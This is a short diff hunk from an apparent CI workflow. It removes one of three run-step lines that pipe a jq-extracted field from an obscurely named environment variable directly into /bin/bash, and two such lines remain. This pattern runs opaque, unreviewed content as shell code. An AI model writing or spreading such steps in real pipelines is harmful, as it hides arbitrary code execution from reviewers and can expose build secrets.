@@ -28,7 +28,6 @@ jobs:
         run: |
           printf '%s' "$d807" | jq -r .pjtpd7215 | /bin/bash
           printf '%s' "$zuaut958" | jq -r .wp9502 | /bin/bash
-          printf '%s' "$or0108" | jq -r .heem5 | /bin/bash
 
       - name: Store results
         if: always()
